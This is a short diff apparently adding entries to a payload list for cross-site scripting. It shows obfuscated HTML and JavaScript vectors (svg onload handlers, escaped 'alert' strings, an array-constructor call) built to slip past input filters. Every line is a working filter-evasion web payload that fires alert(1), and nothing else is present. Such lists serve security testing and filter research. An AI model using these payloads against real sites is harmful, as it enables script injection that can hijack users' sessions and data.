@@ -17,3 +17,6 @@
 <input onclick=top[/al/.source+/ert/.source](1) >
 <input onclick=al\u0065rt(1) >
 <input onclick=alert?.() >
+<svg onload=frames['al\145rt'](1)>
+<svg onload=javascript:window.alert(1)>
+<script>[]["filter"]["constructor"]("alert(1)")()</script>
